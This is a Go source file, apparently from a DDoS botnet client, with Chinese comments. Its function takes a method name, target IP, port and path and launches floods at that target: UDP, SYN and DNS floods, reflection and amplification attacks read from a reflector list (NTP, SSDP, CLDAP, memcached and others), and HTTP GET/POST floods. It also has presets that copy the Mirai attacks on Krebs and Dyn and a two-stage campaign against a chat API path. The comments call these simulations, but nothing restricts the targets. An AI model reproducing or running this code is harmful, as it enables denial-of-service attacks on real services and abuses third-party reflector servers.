package attacker

import (
	"bot/attacker/attack"
	"fmt"
	"log"
	"strings"
)

// ResetStopChannel 全局变量，用于确认是否已经初始化了停止通道
var stopChannelInitialized = false

// AttackInit 初始化攻击
func AttackInit(method string, dstip string, dstport int, path string) {
	// 重新初始化停止通道
	attack.ResetStopChannel()
	
	switch method {
	case "STOP":
		// 停止攻击
		close(attack.STOP)
		log.Println("停止所有攻击")
		return

	// Layer4 攻击
	case "UDP", "DNS", "DNSA", "SYN", "RDP", "CLDAP", "MEMCACHED", "ARD", "NTP", "SSDP", "CHARGEN", "SNMP", "QUIC", "OPENVPN", "TFTP","DNSBOMB","DNSBOOMERANG":
		attack4 := attack.Layer4{
			Method:      method,
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 10,
			AmpFile:     "serverfile/reflector.txt",
		}
		
		// 对特定攻击方法自定义参数
		if method == "DNS" || method == "DNSA" {
			attack4.Reservedfield = "example.com" // 默认域名查询
		}
		
		go attack4.StartAttack()

	// Layer7 攻击
	case "GET","POST","LOGIN","COOKIE":
		target := formatTarget(dstip, dstport)
		attack7 := attack.HTTP{
			Method:    method,
			Target:    target,
			Threads:   10,
			Path:      path,
		}
		go attack7.HTTPStart()

	// 僵尸网络模拟
	case "MIRAI_1":	   // Mirai僵尸网络攻击,使用UDP和DNS泛洪。模拟Krebs被打
		udp := attack.Layer4{
			Method:      "UDP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 7,
			AmpFile:     "serverfile/reflector.txt",
		}
		dns := attack.Layer4{
			Method:      "DNS",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 2,
			AmpFile:     "serverfile/reflector.txt",
		}
		syn := attack.Layer4{
			Method:      "SYN",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 1,
			AmpFile:     "serverfile/reflector.txt",
		}
		go udp.StartAttack()
		go dns.StartAttack()
		go syn.StartAttack()


	case "MIRAI_2":	   // Mirai僵尸网络攻击,模拟Dyn被打
		syn := attack.Layer4{ 
			Method:      "SYN",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 3,
			AmpFile:     "serverfile/reflector.txt",
		}
		dns := attack.Layer4{
			Method:      "dns",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 7,
			AmpFile:     "serverfile/reflector.txt",
		}
		go syn.StartAttack()
		go dns.StartAttack()

	case "DEEPSEEK_1": // 第一阶段NTP、SSDP、CLDAP反射放大
		ntp := attack.Layer4{
			Method:      "NTP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 4,
			AmpFile:     "serverfile/reflector.txt",
		}
		ssdp := attack.Layer4{
			Method:      "SSDP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 4,
			AmpFile:     "serverfile/reflector.txt",
		}
		cldap := attack.Layer4{
			Method:      "CLDAP",
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: 2,
			AmpFile:     "serverfile/reflector.txt",
		}
		go ntp.StartAttack()
		go ssdp.StartAttack()
		go cldap.StartAttack()
	case "DEEPSEEK_2": // 第二阶段HTTP攻击
		target := formatTarget(dstip, dstport)
		// 检查path是否为空，如果为空则设置为"/chat"
		if path == "" {
			path = "/api/chat"
		}
		attack7 := attack.HTTP{
			Method:    method,
			Target:    target,
			Threads:   10,
			Path:      path,
		}
		go attack7.HTTPStart()

	default:
		log.Printf("未知攻击方法: %s", method)
	}
}

// 格式化目标URL
func formatTarget(dstip string, dstport int) string {
	// 检查IP是否已经是URL格式
	if strings.HasPrefix(dstip, "http://") || strings.HasPrefix(dstip, "https://") {
		// 已经是URL格式，直接返回
		return dstip
	}
	
	// 构建基本的HTTP URL
	return fmt.Sprintf("http://%s:%d", dstip, dstport)
}